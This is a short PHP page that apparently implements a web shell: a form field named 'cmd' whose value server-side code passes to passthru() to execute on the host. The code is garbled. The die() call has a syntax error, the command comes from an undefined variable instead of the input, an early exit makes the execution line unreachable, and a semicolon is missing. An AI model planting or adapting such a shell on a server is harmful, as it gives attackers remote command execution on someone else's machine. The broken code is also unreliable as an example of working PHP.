<html>
    <body>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF'] or die('extract failed'.)); ?>">
            <input type="TEXT" name="cmd" id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
            </form>
            <pre>
                <?php
                    if(isset($_GET['cmd']))
                    {
                        $command = join(' ', array_map('escapeshellarg', $args));
                        echo($command);exit;
                        passthru($command, $exitCode);
                        exit($exitCode)
                    }
                ?>
            </pre>
    </body>
    <script>document.getElementById("cmd").focus();</script>
</html>